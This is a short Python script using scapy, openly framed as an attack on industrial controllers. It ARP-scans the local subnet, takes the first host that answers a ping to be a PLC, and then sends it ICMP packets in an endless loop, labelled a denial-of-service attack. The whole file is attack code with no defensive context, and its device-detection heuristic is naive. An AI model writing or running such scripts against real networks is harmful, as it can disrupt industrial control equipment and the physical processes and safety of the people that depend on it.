from scapy.all import *
import os
import re
import time

def find_plc_ip():
    """
    Scans the local network to find the PLC's IP address.
    Assumes the PLC responds to ICMP ping requests.
    """
    # Get the local IP address and subnet
    local_ip = os.popen('ipconfig').read()
    local_ip = re.search(r'IPv4 Address.*?(\d+\.\d+\.\d+\.\d+)', local_ip).group(1)
    subnet = '.'.join(local_ip.split('.')[:-1]) + '.0/24'

    print(f"[*] Scanning subnet {subnet} for PLC...")

    # Perform an ARP scan to find active devices
    ans, _ = arping(subnet, verbose=0)

    for _, rcv in ans:
        ip = rcv.psrc
        print(f"[+] Found device at IP: {ip}")

        # Example heuristic: Assume a PLC responds to a specific ICMP request
        try:
            print(f"[*] Testing if {ip} is a PLC...")
            response = sr1(IP(dst=ip)/ICMP(), timeout=1, verbose=0)
            if response:
                print(f"[+] Device at {ip} responded to ICMP ping. Likely a PLC.")
                return ip
        except Exception as e:
            print(f"[-] Error testing {ip}: {e}")

    print("[-] Could not find a PLC on the network.")
    return None

def dos_attack(plc_ip):
    """
    Performs a Denial-of-Service (DoS) attack on the PLC by overwhelming it with ICMP requests.
    """
    print(f"[*] Starting DoS attack on PLC at {plc_ip}...")
    try:
        while True:
            send(IP(dst=plc_ip)/ICMP(), verbose=0)
            print(f"[*] Sent ICMP request to {plc_ip}")
            time.sleep(0.1)  # Adjust the delay to control the attack rate
    except KeyboardInterrupt:
        print("\n[*] DoS attack stopped.")

if __name__ == "__main__":
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        exit("[-] Exiting: PLC not found.")

    # Step 2: Perform the DoS attack
    dos_attack(plc_ip)